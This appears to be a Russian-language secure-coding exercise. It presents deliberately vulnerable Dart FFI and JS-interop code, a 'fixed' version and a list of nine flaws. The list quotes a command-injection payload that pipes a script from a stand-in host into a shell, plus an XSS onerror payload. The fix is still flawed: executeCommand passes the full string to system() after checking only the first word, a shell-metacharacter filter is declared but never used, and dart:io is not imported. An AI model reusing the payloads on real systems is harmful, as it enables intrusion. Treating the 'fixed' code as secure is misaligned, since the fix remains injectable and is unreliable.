В коде FFI и JS-интероп есть уязвимости и ошибки безопасности. Найди их.

```dart
// ── FFI-обёртка (намеренно испорченная версия) ────────────────────
import 'dart:ffi';
import 'package:ffi/ffi.dart';

typedef SystemC = Int32 Function(Pointer<Utf8>);
typedef SystemDart = int Function(Pointer<Utf8>);

// bug 1: никаких ограничений — выполняет любую переданную команду (RCE)
int executeCommand(String command) {
  final lib = DynamicLibrary.process();
  final systemFunc = lib.lookupFunction<SystemC, SystemDart>('system');

  final cmdPtr = command.toNativeUtf8(allocator: calloc);
  final result = systemFunc(cmdPtr);
  calloc.free(cmdPtr);  // bug 2: нет try/finally — при исключении память утечёт
  return result;
}

// bug 3: конкатенация пользовательского ввода в shell-команду (command injection)
int listDirectory(String userInput) {
  return executeCommand('ls -la $userInput');
}

// ── JS interop (намеренно испорченная версия) ─────────────────────
import 'dart:js_interop';

@JS('localStorage')
external JSObject get localStorage;

extension type Storage(JSObject _) implements JSObject {
  external String? getItem(String key);
  external void setItem(String key, String value);
}

// bug 4: нет валидации — ключ может содержать спецсимволы
void saveToStorage(String key, String value) {
  Storage(localStorage).setItem(key, value);
}

// bug 5: innerHTML без санитизации — XSS
@JS('document.getElementById')
external JSObject? getElementById(String id);

extension type HtmlElement(JSObject _) implements JSObject {
  external set innerHTML(String html);
}

void displayUserContent(String userId, String content) {
  // bug 5: вставляем пользовательский content напрямую в innerHTML
  final element = HtmlElement(getElementById(userId)!);
  element.innerHTML = content;
}

// bug 6: небезопасное использование eval через JS interop
@JS('eval')
external JSAny jsEval(String code);

// bug 7: данные из JS не проверяются перед использованием
String getUserName() {
  // Получаем из JS window.currentUser.name
  final storage = Storage(localStorage);
  return storage.getItem('user_name') ?? 'Anonymous';
  // bug 7: значение из localStorage может содержать HTML/JS — используем как HTML
}

void renderGreeting() {
  final name = getUserName();
  final element = HtmlElement(getElementById('greeting')!);
  // bug 7 продолжение: DOM XSS через innerHTML
  element.innerHTML = '<h1>Hello, $name!</h1>';
}

// bug 8: секрет передаётся в JS как глобальная переменная
@JS('window.apiKey')
external set windowApiKey(String value);

void initializeApp(String apiKey) {
  windowApiKey = apiKey;  // bug 8: любой JS-код на странице может прочесть window.apiKey
  print('App initialized');
}

// bug 9: нет обработки исключений — localStorage может быть заблокирован
String readLocalStorage(String key) {
  return Storage(localStorage).getItem(key)!;  // bug 9: ! без проверки на null
}
```

```dart
// ── Исправленный FFI-код ──────────────────────────────────────────
import 'dart:ffi';
import 'package:ffi/ffi.dart';

class SecurityException implements Exception {
  final String message;
  const SecurityException(this.message);
  @override
  String toString() => 'SecurityException: $message';
}

typedef SystemC = Int32 Function(Pointer<Utf8>);
typedef SystemDart = int Function(Pointer<Utf8>);

// fix 1: белый список допустимых команд
const _allowedCommands = {'ls', 'pwd', 'date'};
final _shellMeta = RegExp(r'[;&|$`\\!<>(){}\[\]\'"*?~]');

// fix 1 + 2: валидация + try/finally для гарантированного освобождения памяти
int executeCommand(String command) {
  final exec = command.split(' ').first;
  if (!_allowedCommands.contains(exec)) {
    throw SecurityException('Command "$exec" is not allowed');
  }

  final lib = DynamicLibrary.process();
  final systemFunc = lib.lookupFunction<SystemC, SystemDart>('system');

  final cmdPtr = command.toNativeUtf8(allocator: calloc);
  try {
    return systemFunc(cmdPtr);
  } finally {
    calloc.free(cmdPtr);  // fix 2: гарантированное освобождение
  }
}

// fix 3: НЕ конкатенируем пользовательский ввод в shell-команду
// Для ls без произвольных аргументов — используем Dart-нативный API
void listDirectory(String dirPath) {
  // Валидируем путь: только допустимые символы
  if (dirPath.contains('..') || dirPath.contains(';') || dirPath.contains('|')) {
    throw SecurityException('Invalid directory path: $dirPath');
  }
  // Используем dart:io напрямую вместо shell
  final dir = Directory(dirPath);
  if (!dir.existsSync()) throw ArgumentError('Directory not found: $dirPath');
  for (final entity in dir.listSync()) {
    print(entity.path);
  }
}

// ── Исправленный JS interop ───────────────────────────────────────
import 'dart:js_interop';

@JS('localStorage')
external JSObject get _localStorage;

extension type _Storage(JSObject _) implements JSObject {
  external String? getItem(String key);
  external void setItem(String key, String value);
}

final _validKey = RegExp(r'^[a-zA-Z0-9_\-]{1,64}$');

// fix 4: валидация ключа и значения перед записью в localStorage
void saveToStorage(String key, String value) {
  if (!_validKey.hasMatch(key)) {
    throw SecurityException('Invalid storage key: "$key"');
  }
  if (value.length > 4096 || value.contains('\x00')) {
    throw SecurityException('Invalid storage value');
  }
  try {
    _Storage(_localStorage).setItem(key, value);
  } catch (e) {
    throw SecurityException('localStorage unavailable: $e');
  }
}

// fix 5: используем textContent вместо innerHTML для пользовательского контента
@JS('document.getElementById')
external JSObject? _getElementById(String id);

extension type HtmlElement(JSObject _) implements JSObject {
  external set innerHTML(String html);
  external set textContent(String text);  // безопасная альтернатива
}

void displayUserContent(String elementId, String content) {
  final el = _getElementById(elementId);
  if (el == null) return;
  // fix 5: textContent экранирует HTML автоматически — нет XSS
  HtmlElement(el).textContent = content;
}

// fix 6: НИКОГДА не используем eval — это явная XSS/code injection
// Убираем jsEval полностью. Если нужна динамика — используем безопасные API

// fix 7: экранируем данные из хранилища перед вставкой в DOM
String _htmlEscape(String input) => input
    .replaceAll('&', '&amp;')
    .replaceAll('<', '&lt;')
    .replaceAll('>', '&gt;')
    .replaceAll('"', '&quot;');

String getUserName() {
  final storage = _Storage(_localStorage);
  // fix 9: null-safe обращение, нет ! без проверки
  return storage.getItem('user_name') ?? 'Anonymous';
}

void renderGreeting() {
  final name = getUserName();
  final el = _getElementById('greeting');
  if (el == null) return;
  // fix 7: экранируем имя перед вставкой в innerHTML
  HtmlElement(el).innerHTML = '<h1>Hello, ${_htmlEscape(name)}!</h1>';
  // Ещё лучше: использовать textContent и разбивать на несколько узлов через DOM API
}

// fix 8: НЕ храним секреты в глобальных JS-переменных
// Передаём apiKey только в заголовках HTTP-запросов через XMLHttpRequest/fetch,
// не раскрываем через window.* — любой скрипт на странице может его прочесть
void initializeApp(String apiKey) {
  // Используем замыкание или closure — не помещаем в window
  // В реальном коде: apiKey используется только внутри функции, не сохраняется глобально
  print('App initialized');
  // apiKey используется только при конкретных вызовах, не хранится в window
}

// fix 9: безопасное чтение с null-check и обработкой исключений
String? readLocalStorage(String key) {
  if (!_validKey.hasMatch(key)) return null;
  try {
    return _Storage(_localStorage).getItem(key);  // fix 9: возвращаем String? без !
  } catch (_) {
    // localStorage может быть заблокирован (private mode, cross-origin)
    return null;
  }
}
```

**9 уязвимостей:** 1) `executeCommand` без белого списка — произвольное выполнение команд (RCE). 2) Нет `try/finally` — утечка нативной памяти при исключении. 3) `'ls -la $userInput'` — command injection: `userInput = '; curl https://evil.com | sh'`. 4) `setItem` без валидации ключа — атакующий может задать ключ `__proto__` или ключ со скриптом. 5) `innerHTML = content` — DOM XSS: если `content = '<img src=x onerror=alert(1)>'`. 6) Прямой доступ к `eval` через interop — выполнение произвольного JavaScript. 7) Данные из `localStorage` (контролируемые атакующим) вставляются в `innerHTML` без экранирования — stored/DOM XSS. 8) `window.apiKey = apiKey` — любой сторонний скрипт (реклама, аналитика) может прочесть `apiKey` из глобальной переменной. 9) `getItem(key)!` без null-check — `Null check operator on null value` при отсутствии ключа или недоступности localStorage.
